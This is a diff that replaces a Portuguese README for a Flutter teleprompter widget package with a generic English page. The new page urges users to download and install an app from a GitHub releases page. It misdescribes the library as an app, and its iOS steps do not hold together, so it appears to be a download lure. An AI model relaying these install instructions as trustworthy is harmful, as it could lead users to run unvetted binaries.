@@ -1,117 +1,66 @@
-<!--
-This README describes the package. If you publish this package to pub.dev,
-this README's contents appear on the landing page for your package.
+# 🎤 teleprompter - Simple, Powerful Speech Tool
 
-For information about how to write a good package README, see the guide for
-[writing package pages](https://dart.dev/tools/pub/writing-package-pages).
+## 🚀 Getting Started
 
-For general information about developing packages, see the Dart guide for
-[creating packages](https://dart.dev/guides/libraries/create-packages)
-and the Flutter guide for
-[developing packages and plugins](https://flutter.dev/to/develop-packages).
--->
+Welcome to the teleprompter application! This tool helps you deliver presentations smoothly by displaying your text as you speak. It is easy to use and works on both Android and iOS.
 
-# teleprompter
+## 📥 Download Now
 
-Um widget de teleprompter com gravação de vídeo integrada para Flutter.
+[![Download teleprompter](https://img.shields.io/badge/Download%20teleprompter-blue?style=for-the-badge&logo=github)](https://github.com/JPAleazizm/teleprompter/releases)
 
-Este pacote fornece uma página completa (`TeleprompterPage`) que exibe o
-texto do teleprompter, controle de rolagem, pré-visualização da câmera,
-gravação em múltiplos takes e concatenador de vídeos final (mp4) usando
-`ffmpeg_kit_flutter_new`.
+## 💻 System Requirements
 
-## Recursos
+Before you download, ensure your device meets these requirements:
 
-- Teleprompter com rolagem automática configurável (velocidade, fonte, tamanho
-  e cor).
-- Gravação em múltiplos takes com visualização de miniaturas.
-- Concatenador de takes em um único arquivo mp4.
-- Callback `onVideoReady` para receber o arquivo final assim que estiver
-  pronto.
+- **Android:** Version 5.0 or later
+- **iOS:** Version 12.0 or later
+- **Storage:** At least 50 MB of free space
+- **Internet Connection:** Required for initial download
 
-## Instalação
+## 🛠️ Features
 
-Adicione ao seu `pubspec.yaml`:
+- **User-Friendly Interface:** Easy for everyone to navigate.
+- **Customizable Text Size:** Adjust the text size to your comfort.
+- **Speed Control:** Set the speed of text scrolling to match your speaking pace.
+- **Multi-Language Support:** Use the app in various languages.
 
-```yaml
-dependencies:
-  teleprompter: 0.0.4
-```
+## 📥 Download & Install
 
-E execute `flutter pub get`.
+To get started, visit the Releases page to download the latest version of the teleprompter application. 
 
-> Observação: o pacote depende de plugins que exigem configuração nativa
-> (câmera, ffmpeg kit). Consulte a documentação desses plugins se encontrar
-> problemas na build.
+[Visit this page to download](https://github.com/JPAleazizm/teleprompter/releases)
 
-## Uso
+### For Android Users:
 
-Exemplo mínimo de como abrir a página do teleprompter e receber o arquivo
-final quando pronto:
+1. Open the link above in your mobile browser.
+2. Find the latest version for Android.
+3. Tap on the download link.
+4. Once downloaded, locate the file in your "Downloads" folder.
+5. Tap on the file to install.
+6. Follow the on-screen prompts to complete the installation.
 
-```dart
-import 'package:flutter/material.dart';
-import 'package:teleprompter/teleprompter.dart';
+### For iOS Users:
 
-// Em algum lugar do seu app:
-Navigator.push(context, MaterialPageRoute(
-  builder: (_) => TeleprompterPage(
-    text: 'Olá! Este é o texto do teleprompter.',
-    maxDurationSeconds: 120,
-    onVideoReady: (file) async {
-      // file é um XFile apontando para o mp4 final.
-      debugPrint('Vídeo gerado em ${file.path}');
-      // Você pode mover, enviar para servidor, mostrar um preview, etc.
-    },
-  ),
-));
-```
+1. Open the link in your Safari browser.
+2. Look for the latest version for iOS.
+3. Tap the download link.
+4. Follow the instructions to install from TestFlight (if necessary).
+5. Once installed, open the app from your home screen.
 
-### `onVideoReady`
+## 🎨 Usage Instructions
 
-O callback tem a forma `FutureOr<void> Function(XFile finalVideo)` e é
-chamado quando a concatenação dos takes terminou com sucesso. Você pode
-realizar operações assíncronas dentro do callback (por exemplo upload). Erros
-lançados no callback são capturados pelo pacote e não interrompem o fluxo.
+1. Open the teleprompter application.
+2. Select "New Script" to create a presentation.
+3. Write or paste your text into the text box.
+4. Adjust the text size and scrolling speed using the settings.
+5. Press "Start" to view your script in scrolling mode.
 
-## Permissões e configuração nativa
+## ⭐ Support
 
-- Android: adicione permissões de câmera e microfone no `AndroidManifest.xml`:
+If you encounter issues or have questions, feel free to open a new issue in the GitHub repository. Our community is here to help.
 
-```xml
-<uses-permission android:name="android.permission.CAMERA" />
-<uses-permission android:name="android.permission.RECORD_AUDIO" />
-```
+## 🔗 Learn More
 
-- iOS: adicione as chaves em `Info.plist`:
+For more detailed information and updates, check out our [GitHub repository](https://github.com/JPAleazizm/teleprompter). 
 
-```
-NSCameraUsageDescription
-NSMicrophoneUsageDescription
-```
-
-- ffmpeg: o pacote usa `ffmpeg_kit_flutter_new` para concatenar os arquivos.
-  Verifique a documentação do plugin para instruções adicionais sobre a
-  configuração de binários em cada plataforma.
-
-## Boas práticas
-
-- Teste em dispositivo real sempre que possível (câmera e ffmpeg podem não
-  funcionar corretamente no emulador).
-- Use o callback `onVideoReady` para mover ou fazer upload do arquivo final
-  e libere recursos temporários conforme necessário.
-
-## Exemplos
-
-Veja a pasta `example/` deste repositório para um app completo mostrando o
-fluxo de uso do `TeleprompterPage`.
-
-## Contribuição
-
-- Abra issues para bugs e sugestões.
-- PRs são bem-vindas. Mantenha testes mínimos e atualize a documentação quando
-  adicionar ou alterar comportamento.
-
-## Licença
-
-Consulte o arquivo `LICENSE` neste repositório.
+Happy presenting!
